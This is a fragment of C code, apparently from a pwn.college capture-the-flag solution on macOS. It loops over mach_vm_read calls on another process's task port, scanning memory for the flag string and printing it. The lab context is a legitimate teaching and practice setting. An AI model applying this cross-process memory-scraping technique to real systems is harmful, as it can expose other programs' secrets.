...
void receive_loop(mach_port_t port) {
	...
	mach_msg_type_number_t data_cnt = 0;
        printf("target_task: 0x%x", target_task);

        while(1) {
            kr = mach_vm_read(target_task, address, vm_size, &offset, &data_cnt);
            if (kr != KERN_SUCCESS) {
                //printf("vm read failed: %s\n", mach_error_string(kr));
            }

            else {
                //printf("find valid page:%p\n", address);
                for (int i = 0; i <= 0xff0; i++) {

                    if (memcmp(offset + i, "pwn.college", 11) == 0){
                        printf("%s", offset+i);
                        goto finish;
                    }
            }
